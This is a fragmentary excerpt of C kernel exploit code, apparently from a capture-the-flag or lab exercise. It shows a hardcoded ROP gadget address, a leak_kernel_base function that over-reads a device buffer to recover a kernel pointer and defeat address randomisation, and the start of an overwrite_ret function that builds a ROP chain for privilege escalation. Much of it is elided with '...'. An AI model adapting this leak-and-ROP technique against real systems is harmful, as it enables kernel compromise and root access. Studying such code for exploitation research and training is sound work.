...
uint64_t pop_rcx_ret = 0xffffffff8132cdd3;
...
void leak_kernel_base() {
  char leak_buf[0x440];
  read(global_fd, leak_buf, 0x440);
  uint64_t *leak = (uint64_t *)(leak_buf + 0x408);
  printf("[*]The leaked address is: 0x%lx\n", *leak);
  kernel_base = *leak - (0xffffffff8113d33c - 0xffffffff81000000);
  printf("[*]The kernel base is: 0x%lx\n", kernel_base);
}
...
void overwrite_ret() {
  ...
  *rop_chain++ = 0;
  *rop_chain++ = mov_rdi_rax_ret - base + kernel_base;
